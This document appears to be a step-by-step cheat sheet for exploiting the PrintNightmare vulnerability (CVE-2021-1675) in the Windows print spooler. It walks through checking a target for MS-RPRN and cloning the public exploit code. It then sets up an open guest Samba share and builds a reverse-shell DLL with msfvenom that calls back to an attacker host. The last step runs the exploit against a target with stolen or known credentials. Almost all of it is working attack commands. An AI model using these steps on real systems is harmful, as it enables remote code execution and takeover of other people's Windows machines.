# PrintNightmare - RCE


## Check if vulnerable to PrintNightmare

    rpcdump.py @IP_ADDRESS |grep MS-RPRN


## Setup Exploit

    git clone https://github.com/cube0x0/CVE-2021-1675 CVE-2021-1675/CVE-2021-1675
    git clone https://github.com/cube0x0/impacket CVE-2021-1675/impacket
    wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/d6ecf9976e78fc9c37caa9ad1c3360447c785a96/CVE-2021-1675.py -O CVE-2021-1675/CVE-2021-1675/PrintNightmare.py

cd CVE-2021-1675

    python -m venv venv
    source venv/bin/activate 

### Impacket Setup
    cd CVE-2021-1675/impacket/
    pip install -r requirements.txt
    python setup.py install
    cd - 

### Setup SAMBA

Install SAMBA

    yay samba


#### Check samba status

    systemctl status smb

#### Configure samba

Create share folder

    mkdir -p /tmp/share

Backup samba config

    sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.bak

sudo nano /etc/samba/smb.conf

```conf
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445
    log level = 1 auth_audit:3 auth_json_audit:3

[smb]
    comment = Samba
    path = /tmp/share
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
    force group = smbgroup
    public = yes
```

Create user and group for share:

    sudo groupadd --system smbgroup
    sudo useradd --system --no-create-home --group smbgroup -s /bin/false smbuser

Start samba service

    sudo systemctl start smb
    systemctl status smb

Check access 

    smbmap -H L_IP_ADDRESS
    smbmap -H L_IP_ADDRESS\smb

### Create DLL

With meterpreter 

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=L_IP_ADDRESS LPORT=1337 -f dll > /tmp/share/system.dll

Custom dll 

    x86_64-w64-mingw32-gcc exploit.c -o /tmp/share/system.dll -lws2_32 -shared 

## Exploit

PATH_DLL: `\\L_IP_ADDRESS\smb\system.dll`


```bash
cd CVE-2021-1675/CVE-2021-1675
python PrintNightmare.py 'USERNAME:PASSWORD@IP_TARGET' '\\L_IP_ADDRESS\smb\system.dll'
```